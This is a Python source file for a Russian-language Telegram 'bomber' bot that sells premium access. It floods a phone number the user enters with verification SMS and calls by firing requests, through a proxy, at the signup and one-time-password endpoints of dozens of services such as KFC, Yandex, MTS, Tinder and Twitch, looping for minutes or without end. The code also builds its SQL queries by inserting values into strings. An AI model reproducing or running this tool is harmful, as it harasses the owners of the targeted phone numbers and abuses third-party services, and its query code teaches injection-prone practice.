        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Karusel sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] KFC sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Yandex.Chef sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                      params={"msisdn": _phone}, proxies={"http": "104.20.7.231:8080"})
        print('[+] MTS отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post("https://api.delitime.ru/api/v2/signup",
                      data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Delitime sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone},
                     proxies={"http": "104.20.7.231:8080"})
        print('[+] findclone звонок отправлен!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone}},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Guru sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                      data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                            "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, proxies={"http": "104.20.7.231:8080"})
        print('[+] ICQ sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                      data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                            "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] InDriver sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                      data={"password": password, "application": "lkp", "login": "+" + _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Invitro sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Pmsm sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] IVI sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Lenta sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                      json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Mail.ru sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                      params={"pageName": "registerPrivateUserPhoneVerificatio"},
                      data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] MVideo sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                      data={"st.r.phone": "+" + _phone}, proxies={"http": "104.20.7.231:8080"})
        print('[+] OK sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] qlean sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
                      headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
                      params={"phone": _phone, "clientId": "undefined", "sessionId": str(random.randint(5000, 9999))},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Qlean отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone}, proxies={"http": "104.20.7.231:8080"})
        print('[+] SMSgorod sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                      data={'phone_number': _phone}, proxies={"http": "104.20.7.231:8080"})
        print('[+] Tinder sent!')
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',
                      json={"birthday": {"day": 11, "month": 11, "year": 1999},
                            "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                            "password": password, "phone_number": _phone, "username": username},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Twitch sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                      headers={'App-ID': 'cabinet'}, proxies={"http": "104.20.7.231:8080"})
        print('[+] CabWiFi sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] wowworks sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Eda.Yandex sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Youla sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                            "deliveryOption": "sms"}, proxies={"http": "104.20.7.231:8080"})
        print('[+] Alpari sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] SMS sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Delivery sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

def start_spam(chat_id, phone_number, force):
    global msg
    running_spams_per_chat_id.append(chat_id)

    with open("premium.txt") as file:
        arrayBL = [row.strip() for row in file]
        iduser = f'{chat_id}'
    if iduser not in arrayBL:
        bot.send_message(chat_id, "У вас нет премиума \n За покупкой - @viannedi", parse_mode="HTML")
    else:
        msg = f'‍Номер телефона: {phone_number}\nТаймер: ~Бесконечно\nСпам успешно начался!'

    bot.send_message(chat_id, msg)
    end = datetime.now() + timedelta(minutes=5)
    while (datetime.now() < end) or (force and chat_id == ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number(phone_number)
    bot.send_message(chat_id, f'Спам на номер {phone_number} завершён')
    THREADS_AMOUNT[0] -= 10  # стояло 1
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass



def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, 'Вы уже начали рассылку спама. Дождитесь окончания или нажмите Остановить спам и попробуйте снова')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = Thread(target=start_spam, args=(chat_id, phone, force))
        threads.append(x)
        THREADS_AMOUNT[0] += 10
        x.start()
    else:
        bot.send_message(chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут.')
        print('Максимальное количество тредов исполняется. Действие отменено.')


@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    global text
    chat_id = int(message.chat.id)
    text = message.text

    if text == 'пакпкп':
        bot.send_message(chat_id,
                         '❤️Возникли проблемы? - @viannedi \n Чат элиты - @VV2_Chat \n Так же спасибо \n @artem7, @crinny',
                         parse_mode='HTML')

    elif text == 'Бомбер':
        bot.send_message(chat_id,
                         'Для начала спама - ведите номер с кодом страны\n Без +')

    elif text == 'Рассылка' and chat_id == ADMIN_CHAT_ID:
        bot.send_message(chat_id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')

    elif text == 'Соглашение':

        bot.send_message(chat_id,
                         'Проходя регестрацию в боте вы соглашаетесь с данными правилами! - https://telegra.ph/FAQ-02-02-5')

    elif text == 'Отключить':
        if chat_id not in running_spams_per_chat_id:
            bot.send_message(chat_id, 'Вы еще не начинали спам')
        else:
            running_spams_per_chat_id.remove(chat_id)
    elif text == '/check':
        result = c.execute(
            f"SELECT * FROM payment_query WHERE user_id = {message.from_user.id}").fetchone()  # достаем данные из таблицы

        # не рекомендую так делать, но это просто для теста (простите)
        sum = result[1]
        random_code = result[2]
        print(sum)
        print(random_code)


        d = 0
        for i in range(len(req['data'])):
                if req['data'][i]['comment'] == message.from_user.id:
                    if req['data'][i]['sum']['amount'] == sum:
                        chat_id = str(message.from_user.id)
                        with open(premium, "a+") as ids_file:
                            ids_file.seek(0)

                            ids_list = [line.split('\n')[0] for line in ids_file]

                            if chat_id not in ids_list:
                                ids_file.write(f'{chat_id}\n')
                                ids_list.append(chat_id)
                                print(f'New chat_id saved: {chat_id}')
                                c.execute(
                                    f"DELETE FROM payment_query WHERE user_id = {message.from_user.id}")  # удаляем временные данные из таблицы
                                bot.send_message(chat_id, 'Отлично вам выдан премиум!')
                if d == len(req['data']):
                    bot.send_message(chat_id, 'Я не нашёл оплаты от вас')

                    # код, который сработает, если оплата прошла успешно

    elif text == 'Премиум':
        markup = types.InlineKeyboardMarkup(row_width=2)
        item1 = types.InlineKeyboardButton("Купить премиум", callback_data='good', url='https://qiwi.me/viannedi')

        markup.add(item1)
        bot.send_message(chat_id,
                         f'❤ Премиум доступ только СЕГОДНЯ - 45Р\n - 120 Сервисов \n Бесконечный флуд \n Доступ НАВСЕГДА \n Запускайте флуд сразу на 10 НОМЕРОВ\n 🙎За покупкой - @viannedi \n Или \n\n Перейдите по ссылке для оплаты \n❗️Обязательно введите коментарий: <code>{message.chat.id}</code>',
                         parse_mode='html', reply_markup=markup)


    elif 'РАЗОСЛАТЬ: ' in text and chat_id == ADMIN_CHAT_ID:
        msg = text.replace("РАЗОСЛАТЬ: ", "")
        send_message_users(msg)
    elif let == 1:
        text = message.text
        check = text.isdigit()

        if check == False:
            pass
        elif len(text) == 11:
            phone = text
            spam_handler(phone, chat_id, force=False)
        elif len(text) == 12:
            phone = text
            spam_handler(phone, chat_id, force=False)
        elif len(text) == 12 and chat_id == ADMIN_CHAT_ID and text[0] == '_':
            phone = text[1:]
            spam_handler(phone, chat_id, force=True)
        else:
            bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
            print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')


if __name__ == '__main__':
    bot.polling(none_stop=True)
